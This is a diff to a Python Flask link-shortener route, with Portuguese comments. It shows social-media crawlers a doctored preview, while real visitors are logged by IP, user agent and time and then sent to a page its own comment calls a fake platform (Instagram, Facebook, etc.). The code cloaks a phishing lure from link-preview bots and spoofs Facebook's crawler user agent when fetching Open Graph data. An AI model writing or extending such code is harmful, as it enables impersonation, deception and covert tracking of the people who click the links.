@@ -220,25 +220,22 @@ def gerar_slug(tamanho=8):
 def rastrear_link(slug):
     link = Link.query.filter_by(slug=slug).first_or_404()
 
-    # Se já tiver um preview manual inserido
-    if link.preview_titulo and link.preview_imagem:
-        return render_template("preview_real.html",
-            titulo=link.preview_titulo,
-            descricao=link.preview_descricao or "Clique para visualizar o conteúdo.",
-            imagem=url_for('static', filename=f'previews/{link.preview_imagem}', _external=True),
-            url_destino=link.destino,
-            tipo=link.preview_tipo or "website",
-            url_real=link.destino
-        )
-
-    # Se não tiver, tenta buscar Open Graph
     user_agent = request.headers.get("User-Agent", "").lower()
     bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
     is_bot = any(bot in user_agent for bot in bots)
 
+    # Se for um bot
     if is_bot:
-        if link.og_title or link.og_image:
-            # Já tem OG salvo no banco
+        if link.preview_titulo and link.preview_imagem:
+            return render_template("preview_real.html",
+                titulo=link.preview_titulo,
+                descricao=link.preview_descricao or "Clique para visualizar o conteúdo.",
+                imagem=url_for('static', filename=f'previews/{link.preview_imagem}', _external=True),
+                url_destino=link.destino,
+                tipo=link.preview_tipo or "website",
+                url_real=link.destino
+            )
+        elif link.og_title or link.og_image:
             return render_template("preview_real.html",
                 titulo=link.og_title or "Acesse este link",
                 descricao=link.og_description or "Clique para visualizar o conteúdo.",
@@ -248,7 +245,6 @@ def rastrear_link(slug):
                 url_real=link.destino
             )
         else:
-            # Tenta buscar ao vivo
             try:
                 headers = {
                     "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
@@ -273,27 +269,22 @@ def rastrear_link(slug):
             except:
                 return render_template("preview_fallback.html", url_destino=link.destino)
 
-    # Se não for bot, redireciona direto
-    return redirect(link.destino)
-
-
-
-    # Visitante real: coleta os dados
+    # Se não for bot (visitante real)
     visitor_ip = request.remote_addr
     timestamp = horario_brasilia()
-    
-    novo = Registro(
+
+    novo_registro = Registro(
         ip=visitor_ip,
         user_agent=request.headers.get("User-Agent"),
         timestamp=timestamp,
         slug=slug
     )
-    db.session.add(novo)
+    db.session.add(novo_registro)
     db.session.commit()
 
+    # Renderiza a plataforma falsa (Instagram, Facebook, etc.)
     template_escolhido = f"{link.plataforma.lower()}.html"
     return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)
-
 def horario_brasilia():
     # Oregon = UTC-7 | Brasília = UTC-3 => diferença = +4 horas
     return (datetime.now() + timedelta(hours=4)).strftime("%d/%m/%Y %H:%M:%S")
